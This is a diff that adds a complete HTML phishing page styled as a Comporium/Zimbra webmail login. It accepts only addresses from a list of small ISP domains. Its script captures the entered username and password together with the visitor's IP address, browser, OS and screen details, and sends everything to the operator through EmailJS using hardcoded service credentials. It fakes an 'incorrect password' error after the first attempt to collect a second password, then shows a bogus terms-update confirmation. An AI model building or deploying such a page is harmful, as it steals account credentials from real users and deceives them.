@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Sign In · Comporium</title>
+  <style>
+    /* ===== base & background ===== */
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;
+      background-color: #0088c1;
+      background-image: url('https://i.imghippo.com/files/Qdz9402nEU.png');
+      background-size: cover;
+      background-position: center;
+      position: relative;
+    }
+    body::before {
+      content: "";
+      position: fixed;
+      top:0; left:0;
+      width: 100%; height: 100%;
+      background-color: #0088c1;
+      opacity: 0.5;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .outer-wrapper {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      box-sizing: border-box;
+      flex-direction: column;
+    }
+
+    /* ===== login card ===== */
+    .form-container {
+      width: 100%;
+      max-width: 370px;
+      background-color: white;
+      padding: 50px 40px;
+      box-sizing: border-box;
+      border-radius: 3px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    .signIn {
+      font-size: 20px;
+      color: #4d4d4d;
+      font-weight: bold;
+      margin: 0 0 25px 0;
+      align-self: flex-start;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      width: 100%;
+    }
+    label {
+      font-weight: normal;
+      font-size: 13px;
+      color: #000000;
+      margin-bottom: 6px;
+      text-align: left;
+    }
+    .custom-input {
+      font-size: 12px;
+      border-radius: 1px;
+      padding: 10px 12px !important;
+      background: #ffffff;
+      border: 1px solid #d9d9d9;
+      box-sizing: border-box;
+      width: 100%;
+      appearance: none;
+      text-shadow: none;
+      margin: 0;
+      transition: border-color 0.3s;
+    }
+    .custom-input:focus {
+      border-color: #0088c1;
+      outline: none;
+    }
+    .input-group {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+    .actions-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 15px;
+    }
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+    }
+    .checkbox-container input[type="checkbox"] {
+      width: 16px;
+      height: 16px;
+      margin-right: 8px;
+      cursor: pointer;
+    }
+    .checkbox-container label {
+      font-weight: normal;
+      font-size: 13px;
+      cursor: pointer;
+      margin: 0;
+    }
+    .custom-submit {
+      background-color: #0088c1;
+      color: #ffffff;
+      font-weight: 400;
+      padding: 0 18px;
+      height: 34px;
+      border: 2px solid #0088c1;
+      border-radius: 4px;
+      cursor: pointer;
+      line-height: 30px;
+      text-align: center;
+      width: auto;
+      box-sizing: border-box;
+      transition: background-color 0.3s, border-color 0.3s;
+    }
+    .custom-submit:hover {
+      background-color: #006f9a;
+      border-color: #006f9a;
+    }
+    .custom-submit:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .error-message {
+      color: red;
+      font-size: 12px;
+      margin-top: -5px;
+      margin-bottom: 5px;
+    }
+    .form-error-banner {
+      display: none;
+      width: 100%;
+      background: #fff5f5;
+      border: 1px solid #f5c2c0;
+      border-left: 4px solid #d93025;
+      border-radius: 4px;
+      padding: 12px 14px;
+      box-sizing: border-box;
+      font-size: 13px;
+      color: #7a1c17;
+      line-height: 1.5;
+      margin-bottom: 5px;
+    }
+    .form-error-banner.show {
+      display: block;
+    }
+    .form-error-banner strong {
+      color: #d93025;
+    }
+    .footer-text {
+      position: absolute;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      color: white;
+      font-size: 10px;
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    /* ============================================================
+       ===== TERMS UPDATE / UPGRADE PAGE (replaces activity) =====
+       ============================================================ */
+    .update-container {
+      display: none;
+      width: 100%;
+      max-width: 560px;
+      background-color: #ffffff;
+      border-radius: 12px;
+      box-shadow: 0 6px 24px rgba(11,43,92,0.08);
+      padding: 40px 42px;
+      box-sizing: border-box;
+      flex-direction: column;
+    }
+    .brand-header {
+      text-align: center;
+      margin-bottom: 26px;
+    }
+    .brand-header .brand-name {
+      margin: 0;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: 1.4px;
+      text-transform: uppercase;
+      color: #0b2b5c;
+    }
+    .brand-header .brand-sub {
+      margin: 4px 0 0;
+      font-size: 12px;
+      color: #5e6f8d;
+      letter-spacing: 0.4px;
+    }
+    .update-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #0b2b5c;
+      margin: 0 0 10px 0;
+      line-height: 1.25;
+    }
+    .update-subtitle {
+      font-size: 14px;
+      color: #5e6f8d;
+      margin: 0 0 26px 0;
+      line-height: 1.6;
+    }
+
+    /* change list card */
+    .change-card {
+      background: #f7f9fe;
+      border: 1px solid #e0e8f2;
+      border-radius: 10px;
+      padding: 20px 22px;
+      margin-bottom: 26px;
+    }
+    .change-card h3 {
+      margin: 0 0 14px 0;
+      font-size: 12px;
+      font-weight: 700;
+      color: #5a6b88;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .change-item {
+      display: flex;
+      align-items: flex-start;
+      padding: 10px 0;
+      border-bottom: 1px dashed #e2e9f4;
+      font-size: 14px;
+      line-height: 1.5;
+      color: #2d3d5c;
+    }
+    .change-item:last-child { border-bottom: none; padding-bottom: 0; }
+    .change-item:first-of-type { padding-top: 0; }
+    .change-item .dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: #0c8fd0;
+      flex-shrink: 0;
+      margin-top: 7px;
+      margin-right: 12px;
+    }
+
+    /* effective date banner */
+    .effective-date {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: #eef6fd;
+      border-left: 4px solid #0c8fd0;
+      border-radius: 6px;
+      padding: 14px 18px;
+      margin-bottom: 26px;
+      font-size: 14px;
+      color: #0b2b5c;
+      line-height: 1.5;
+    }
+    .effective-date .icon { font-size: 18px; }
+
+    /* actions */
+    .actions {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      width: 100%;
+    }
+    .btn-primary {
+      background-color: #0c8fd0;
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 15px;
+      padding: 15px 22px;
+      border: none;
+      border-radius: 40px;
+      cursor: pointer;
+      width: 100%;
+      box-sizing: border-box;
+      transition: background-color 0.25s, transform 0.15s;
+    }
+    .btn-primary:hover { background-color: #0a7ab5; }
+    .btn-primary:active { transform: scale(0.99); }
+    .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
+
+    .btn-secondary {
+      background-color: transparent;
+      color: #0c8fd0;
+      font-weight: 500;
+      font-size: 14px;
+      padding: 12px 22px;
+      border: 1px solid #cdddf0;
+      border-radius: 40px;
+      cursor: pointer;
+      width: 100%;
+      box-sizing: border-box;
+      transition: background-color 0.25s;
+    }
+    .btn-secondary:hover { background-color: #f0f6fd; }
+
+    /* progress view */
+    .progress-view {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 30px 0 10px;
+    }
+    .spinner {
+      width: 46px; height: 46px;
+      border: 4px solid #e0ecf7;
+      border-top-color: #0c8fd0;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin-bottom: 22px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .progress-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #0b2b5c;
+      margin: 0 0 8px 0;
+    }
+    .progress-text {
+      font-size: 14px;
+      color: #5e6f8d;
+      line-height: 1.6;
+      margin: 0;
+      max-width: 360px;
+    }
+
+    /* success view */
+    .success-view {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      padding: 20px 0 6px;
+    }
+    .success-icon {
+      width: 64px; height: 64px;
+      border-radius: 50%;
+      background: #e6f6ee;
+      color: #1a9c5b;
+      font-size: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .success-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #0b2b5c;
+      margin: 0 0 10px 0;
+    }
+    .success-text {
+      font-size: 14px;
+      color: #5e6f8d;
+      line-height: 1.6;
+      margin: 0 0 24px 0;
+      max-width: 380px;
+    }
+    .success-detail {
+      width: 100%;
+      background: #f7f9fe;
+      border: 1px solid #e0e8f2;
+      border-radius: 10px;
+      padding: 18px 20px;
+      box-sizing: border-box;
+      margin-bottom: 22px;
+      text-align: left;
+    }
+    .success-detail .row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      font-size: 13px;
+      border-bottom: 1px solid #eaf0f8;
+    }
+    .success-detail .row:last-child { border-bottom: none; }
+    .success-detail .label { color: #7a8aa3; }
+    .success-detail .value { color: #0b2b5c; font-weight: 600; }
+
+    /* ===== responsive ===== */
+    @media screen and (max-width: 480px) {
+      .form-container {
+        max-width: 100%;
+        padding: 30px 20px;
+        border-radius: 0;
+      }
+      .signIn {
+        font-size: 18px;
+        text-align: center;
+        width: 100%;
+        margin-bottom: 20px;
+        align-self: center;
+      }
+      form { width: 100%; }
+      label { font-size: 14px; }
+      .custom-input {
+        font-size: 14px;
+        padding: 10px 12px !important;
+      }
+      .actions-row {
+        flex-direction: column;
+        gap: 12px;
+        align-items: stretch;
+      }
+      .custom-submit {
+        width: 100%;
+        font-size: 16px;
+        padding: 12px;
+        height: auto;
+        line-height: normal;
+      }
+      .checkbox-container {
+        justify-content: flex-start;
+        margin-top: 5px;
+      }
+      .footer-text {
+        font-size: 9px;
+        padding: 5px 10px;
+        position: relative;
+        bottom: auto;
+      }
+      .update-container {
+        max-width: 100%;
+        padding: 28px 20px;
+        border-radius: 0;
+      }
+      .update-title { font-size: 21px; }
+      .update-subtitle { font-size: 13px; }
+      .change-item { font-size: 13px; }
+      .btn-primary { font-size: 14px; padding: 14px 18px; }
+      .btn-secondary { font-size: 13px; }
+      .success-title { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+<div class="outer-wrapper">
+
+  <!-- ====== LOGIN FORM VIEW ====== -->
+  <div class="form-container" id="login-view">
+    <div class="signIn">Log In</div>
+
+    <div class="form-error-banner" id="form-error-banner">
+      <strong>Incorrect username or password.</strong><br>
+      Please check your details and try again.
+    </div>
+
+    <form id="contact-form" novalidate>
+      <div class="input-group">
+        <label for="email-input">Username</label>
+        <input id="email-input" class="custom-input" type="email" name="user_email" required placeholder=" " />
+        <div id="email-error" class="error-message"></div>
+      </div>
+      <div class="input-group">
+        <label for="password-input">Password</label>
+        <input id="password-input" class="custom-input" type="password" name="user_password" required placeholder=" " />
+        <div id="password-error" class="error-message"></div>
+      </div>
+      <div class="actions-row">
+        <button type="submit" class="custom-submit" id="submit-btn">Continue</button>
+        <div class="checkbox-container">
+          <input type="checkbox" id="stay-signed-in" name="stay_signed_in" />
+          <label for="stay-signed-in">Stay signed in</label>
+        </div>
+      </div>
+    </form>
+  </div>
+
+  <!-- ====== TERMS UPDATE / UPGRADE PAGE (replaces activity) ====== -->
+  <div class="update-container" id="update-view">
+
+    <!-- ===== FORM VIEW ===== -->
+    <div id="form-view">
+      <div class="brand-header">
+        <p class="brand-name">Comporium</p>
+        <p class="brand-sub">Account Services</p>
+      </div>
+
+      <h1 class="update-title">Account upgrade &amp; terms update</h1>
+      <p class="update-subtitle">
+        We've upgraded our account security and updated our terms of service.
+        Please review the changes below and confirm your acceptance to keep your
+        account in good standing.
+      </p>
+
+      <div class="change-card">
+        <h3>What's changing</h3>
+        <div class="change-item">
+          <span class="dot"></span>
+          <span>Enhanced account security and sign-in verification</span>
+        </div>
+        <div class="change-item">
+          <span class="dot"></span>
+          <span>Updated terms of service (effective October 15, 2026)</span>
+        </div>
+        <div class="change-item">
+          <span class="dot"></span>
+          <span>New account management dashboard</span>
+        </div>
+      </div>
+
+      <div class="effective-date">
+        <span class="icon">📅</span>
+        <span><strong>Effective date:</strong> October 15, 2026. Please accept before this date to avoid interruption to your service.</span>
+      </div>
+
+      <div class="actions">
+        <button class="btn-primary" id="accept-btn">Update &amp; Accept Changes</button>
+        <button class="btn-secondary" id="later-btn">Remind me later</button>
+      </div>
+    </div>
+
+    <!-- ===== PROGRESS VIEW ===== -->
+    <div class="progress-view" id="progress-view">
+      <div class="spinner"></div>
+      <h2 class="progress-title">Applying your update…</h2>
+      <p class="progress-text">Please wait while we update your account and apply the new terms. This will only take a moment.</p>
+    </div>
+
+    <!-- ===== SUCCESS VIEW ===== -->
+    <div class="success-view" id="success-view">
+      <div class="success-icon">✓</div>
+      <h2 class="success-title">Your account has been updated</h2>
+      <p class="success-text">
+        Thank you. Your account now reflects the latest security features and
+        updated terms of service. No further action is needed.
+      </p>
+
+      <div class="success-detail">
+        <div class="row"><span class="label">Status</span><span class="value">Updated</span></div>
+        <div class="row"><span class="label">Effective date</span><span class="value">October 15, 2026</span></div>
+        <div class="row"><span class="label">Reference</span><span class="value" id="ref-id">—</span></div>
+      </div>
+
+      <button class="btn-primary" id="done-btn">Return to sign in</button>
+    </div>
+
+  </div>
+
+  <div class="footer-text">Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init("EHKPcgjBux1jmPamR");
+  })();
+
+  // ----- DOM elements -----
+  const form = document.getElementById("contact-form");
+  const emailInput = document.getElementById("email-input");
+  const passwordInput = document.getElementById("password-input");
+  const emailError = document.getElementById("email-error");
+  const passwordError = document.getElementById("password-error");
+  const formErrorBanner = document.getElementById("form-error-banner");
+  const submitBtn = document.getElementById("submit-btn");
+
+  const loginView = document.getElementById("login-view");
+  const updateView = document.getElementById("update-view");
+
+  // Update page views
+  const formView = document.getElementById("form-view");
+  const progressView = document.getElementById("progress-view");
+  const successView = document.getElementById("success-view");
+  const acceptBtn = document.getElementById("accept-btn");
+  const laterBtn = document.getElementById("later-btn");
+  const doneBtn = document.getElementById("done-btn");
+  const refIdEl = document.getElementById("ref-id");
+
+  let attemptNumber = 1;
+
+  // ----- accepted email domains -----
+  const ACCEPTED_DOMAINS = [
+    "bevcomm.net",
+    "nemont.net",
+    "peak.org",
+    "kmtel.com",
+    "highland.net",
+    "peoplescom.net",
+    "web-access.net",
+    "comporium.net"
+  ];
+
+  function buildAllowedDomainRegex(domains) {
+    const escaped = domains.map(d => d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+    return new RegExp(`^[^@\\s]+@(${escaped.join('|')})$`, 'i');
+  }
+  const allowedDomainRegex = buildAllowedDomainRegex(ACCEPTED_DOMAINS);
+
+  // ----- helpers -----
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+    if (ua.includes("Trident")) return "Internet Explorer";
+    if (ua.includes("Edge")) return "Edge";
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari")) return "Safari";
+    return "Unknown";
+  }
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "MacOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("like Mac")) return "iOS";
+    return "Unknown";
+  }
+  function getDeviceType() {
+    const ua = navigator.userAgent;
+    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+    if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+    return "Desktop";
+  }
+  function getTimestamp() {
+    return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+  }
+  function getTimezone() {
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    catch (e) { return "Unknown"; }
+  }
+  async function getIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || "Not available";
+    } catch (e) {
+      return "Not available";
+    }
+  }
+
+  // ----- send to emailjs -----
+  async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
+    const ip = await getIP();
+    const pageTitle = document.title;
+    const pageUrl = window.location.href;
+    const pageHostname = window.location.hostname;
+    const pagePathname = window.location.pathname;
+    const referrer = document.referrer || "Direct";
+    const browser = getBrowser();
+    const os = getOS();
+    const device = getDeviceType();
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const viewportSize = `${window.innerWidth}x${window.innerHeight}`;
+    const timezone = getTimezone();
+    const language = navigator.language || "Unknown";
+    const pageElementCount = document.getElementsByTagName('*').length;
+    const formsCount = document.forms.length;
+    const inputsCount = document.querySelectorAll('input').length;
+    const linksCount = document.querySelectorAll('a').length;
+
+    const attemptLabel = attempt === 1
+      ? "FIRST ATTEMPT (Incorrect credentials shown)"
+      : "SECOND ATTEMPT (Retry after incorrect credentials)";
+
+    const messageLog = `
+${attemptLabel}
+Timestamp: ${getTimestamp()}
+Email/Username: ${emailValue}
+Password: ${passwordValue}
+Page Title: ${pageTitle}
+Page URL: ${pageUrl}
+Hostname: ${pageHostname}
+Pathname: ${pagePathname}
+Referrer: ${referrer}
+Browser: ${browser}
+IP: ${ip}
+OS: ${os}
+Device: ${device}
+Screen Resolution: ${screenResolution}
+Viewport: ${viewportSize}
+Timezone: ${timezone}
+Language: ${language}
+Total Elements: ${pageElementCount}
+Forms: ${formsCount}
+Inputs: ${inputsCount}
+Links: ${linksCount}
+    `.trim();
+
+    const templateParams = {
+      timestamp: getTimestamp(),
+      from_email: emailValue,
+      password: passwordValue,
+      attempt_number: attempt,
+      attempt_label: attemptLabel,
+      page_title: pageTitle,
+      page_url: pageUrl,
+      page_hostname: pageHostname,
+      page_pathname: pagePathname,
+      referrer: referrer,
+      browser: browser,
+      ip: ip,
+      os: os,
+      device: device,
+      screen_resolution: screenResolution,
+      viewport_size: viewportSize,
+      timezone: timezone,
+      language: language,
+      page_element_count: pageElementCount,
+      forms_count: formsCount,
+      inputs_count: inputsCount,
+      links_count: linksCount,
+      message: messageLog
+    };
+
+    try {
+      const response = await emailjs.send("service_kvpr45j", "template_v2xoave", templateParams);
+      console.log(`EmailJS SUCCESS (attempt ${attempt}):`, response.status);
+    } catch (error) {
+      console.error(`EmailJS FAILED (attempt ${attempt}):`, error);
+    }
+  }
+
+  // ----- form submit -----
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    emailError.textContent = "";
+    passwordError.textContent = "";
+
+    const emailValue = emailInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+    let valid = true;
+
+    if (!emailValue) {
+      emailError.textContent = "Email is required.";
+      valid = false;
+    } else if (!allowedDomainRegex.test(emailValue)) {
+      emailError.textContent = "Email must be from an accepted domain.";
+      valid = false;
+    }
+    if (!passwordValue) {
+      passwordError.textContent = "Password is required.";
+      valid = false;
+    }
+    if (!valid) return;
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Verifying…";
+
+    sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
+
+    if (attemptNumber === 1) {
+      attemptNumber = 2;
+      setTimeout(() => {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Continue";
+        formErrorBanner.classList.add("show");
+        passwordInput.value = "";
+        passwordInput.focus();
+        formErrorBanner.scrollIntoView({ behavior: "smooth", block: "nearest" });
+      }, 700);
+    } else {
+      setTimeout(() => {
+        submitBtn.disabled = false;
+        submitBtn.textContent = "Continue";
+        formErrorBanner.classList.remove("show");
+        loginView.style.display = "none";
+        updateView.style.display = "flex";
+        // reset update page to form view
+        showUpdateView(formView);
+      }, 900);
+    }
+  });
+
+  // ============================================================
+  //   TERMS UPDATE PAGE — VIEW SWITCHING
+  // ============================================================
+  function showUpdateView(view) {
+    formView.style.display = "none";
+    progressView.style.display = "none";
+    successView.style.display = "none";
+    view.style.display = "flex";
+    view.style.flexDirection = "column";
+  }
+
+  // Generate a reference ID once per session
+  const refId = "COMP-UPG-" + new Date().getFullYear() +
+                String(new Date().getMonth() + 1).padStart(2, "0") +
+                String(new Date().getDate()).padStart(2, "0") + "-" +
+                Math.random().toString(36).slice(2, 8).toUpperCase();
+  refIdEl.textContent = refId;
+
+  // Accept button → progress → success (no redirect)
+  acceptBtn.addEventListener("click", function() {
+    showUpdateView(progressView);
+    setTimeout(function() {
+      showUpdateView(successView);
+    }, 2200);
+  });
+
+  // Remind me later → gentle inline response
+  laterBtn.addEventListener("click", function() {
+    laterBtn.textContent = "We'll remind you closer to the date";
+    laterBtn.disabled = true;
+    laterBtn.style.opacity = "0.7";
+    laterBtn.style.cursor = "default";
+  });
+
+  // Return to sign in → resets to login view
+  doneBtn.addEventListener("click", function() {
+    // Hide update page, show login, reset state
+    updateView.style.display = "none";
+    loginView.style.display = "flex";
+    form.reset();
+    formErrorBanner.classList.remove("show");
+    attemptNumber = 1;
+
+    // Reset update page back to its form view for next visit
+    showUpdateView(formView);
+
+    // Restore "Remind me later" button in case it was disabled
+    laterBtn.textContent = "Remind me later";
+    laterBtn.disabled = false;
+    laterBtn.style.opacity = "";
+    laterBtn.style.cursor = "";
+
+    // Regenerate reference ID for next session
+    const newRefId = "COMP-UPG-" + new Date().getFullYear() +
+                     String(new Date().getMonth() + 1).padStart(2, "0") +
+                     String(new Date().getDate()).padStart(2, "0") + "-" +
+                     Math.random().toString(36).slice(2, 8).toUpperCase();
+    refIdEl.textContent = newRefId;
+  });
+</script>
+</body>
+</html>
